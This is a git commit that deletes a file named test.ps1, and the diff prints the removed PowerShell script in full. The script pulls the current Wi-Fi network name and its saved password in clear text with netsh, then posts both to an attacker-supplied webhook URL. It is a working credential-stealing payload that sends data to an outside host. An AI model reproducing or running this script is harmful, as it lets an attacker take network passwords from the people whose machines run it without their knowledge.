7bc4a20b35a94c3d4ec40501e7dcfc1e9ee91dec
will-c0de <40558280+will-c0de@users.noreply.github.com>
2023-01-30 18:17:52 +0000

    Delete test.ps1

--- assets/test.ps1
+++
@@ -1,8 +0,0 @@
-$webhookUrl = "$wh"
-if (([string]::IsNullOrEmpty("$webhookUrl"))) {exit}
-$ssid = netsh wlan show interface | Select-String -Pattern ' SSID '
-$ssid = [string]$ssid
-$pos = $ssid.IndexOf(':')
-$ssid = $ssid.Substring($pos+2).Trim()
-$pass = (((netsh.exe wlan show profiles name="$ssid" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
-Invoke-WebRequest -Method Post -Uri "$webhookUrl" -Body "$ssid : $pass"
